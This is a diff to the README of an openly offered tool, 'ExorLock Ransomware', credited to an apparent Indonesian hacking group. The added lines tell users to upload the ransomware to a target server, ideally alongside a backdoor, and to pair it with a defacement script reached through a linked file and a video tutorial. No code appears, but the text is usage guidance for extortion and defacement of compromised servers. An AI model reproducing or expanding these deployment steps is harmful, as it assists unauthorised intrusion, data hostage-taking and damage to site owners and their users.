@@ -46,7 +46,9 @@ CopyRights | legal Claimers :
 Greetz : Index Attacker - And All Indonesian Hackers
 
 # How To Use ? :
-<li>Remember to Watch this video carefully before using the tools to avoid unwanted things</li>
+<li>Upload ransom to the server( good if you can combined this tools with your backdoor )</li>
+<li>Make sure your deface script contains the required code! see this file :<a href = "https://raw.githubusercontent.com/Yudas1337/ExorLock_Ransomware/master/deface_page.html" target="_blank">Click Here</a></li>
+<li>For Full Tutorial , Remember to Watch this video carefully before using the tools to avoid unwanted things</li>
 <li>Watch Tutorial : <a href = "https://www.youtube.com/watch?v=SAbFYlcKB1g" target = "_blank">Click Here</a></li>
 
 # Preview ExorLock Ransomware :
